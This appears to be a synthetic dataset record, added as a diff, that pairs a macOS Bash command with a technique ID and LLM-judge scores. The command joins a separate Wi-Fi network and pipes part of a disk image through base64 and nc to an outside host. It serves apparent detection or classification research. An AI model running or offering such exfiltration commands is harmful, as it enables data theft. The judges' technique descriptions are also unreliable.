@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"lab-rnd-157\" \"rNd!157\" && base64 < <(dd if=/Users/Shared/exports/disk.img bs=1m count=5) | nc 10.203.55.4 61009 -w 2 -N",
+  "explanation": "Exfiltrates only the first few megabytes of a disk image over a separate Wi\u2011Fi SSID to a receiver on an uncommon TCP port, minimizing volume and leveraging an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Disconnect from existing Wi\u2011Fi to avoid the main network.",
+    "Join a research SSID operating outside typical enterprise channels.",
+    "Sample and base64-encode the first 5 MB of a disk image.",
+    "Transmit to a peer over the Wi\u2011Fi path using a high, rarely used port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-23d8e2b9",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct syntax for all components including airport utility, networksetup, base64, dd, and netcat.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over an alternate network as claimed, it doesn't actually modify system images as described in T1011 (Modify System Image) but instead performs data exfiltration which would align better with T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T20:32:15.786646Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for Bash, including balanced quoting, proper command separators, valid flags for each utility, and a correct process substitution.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command effectively performs data exfiltration as described by the explanation's actions, it fundamentally misaligns with the T1011 (Modify System Image) technique and contradicts the stated 'Privilege: None' by requiring `sudo` for network modifications.",
+        "combined_score": 3.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T20:32:47.197386Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid process substitution, correct chaining (&& and |), and plausible flags for macOS tools.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command plausibly exfiltrates a small chunk of a disk image over Wi\u2011Fi as described, it does not align with the provided technique description (Modify System Image) and also contradicts the stated privilege level by using sudo.",
+        "combined_score": 3.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-02T20:33:09.651208Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
